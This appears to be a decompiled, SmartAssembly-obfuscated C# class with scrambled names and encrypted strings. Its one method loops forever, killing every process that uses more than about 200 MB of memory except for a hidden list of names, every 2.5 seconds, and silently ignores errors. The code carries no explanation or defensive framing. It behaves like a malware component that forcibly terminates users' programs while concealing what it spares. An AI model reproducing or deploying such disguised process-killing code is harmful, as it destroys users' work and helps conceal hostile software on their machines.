using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace zvenNXaGjQywAfJS;

public static class uLOFjbzueS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void LeBeZUyFkg()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107407309)) && !process.ProcessName.Contains(getString_0(107407300)) && !process.ProcessName.Contains(getString_0(107407323)) && !process.ProcessName.Contains(getString_0(107407314)) && !process.ProcessName.Contains(getString_0(107407269)) && !process.ProcessName.Contains(getString_0(107407288)) && !process.ProcessName.Contains(getString_0(107406731)) && !process.ProcessName.Contains(getString_0(107406750)) && !process.ProcessName.Contains(getString_0(107406705)) && !process.ProcessName.Contains(getString_0(107406692)) && !process.ProcessName.Contains(getString_0(107406671)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static uLOFjbzueS()
	{
		Strings.CreateGetStringDelegate(typeof(uLOFjbzueS));
	}
}
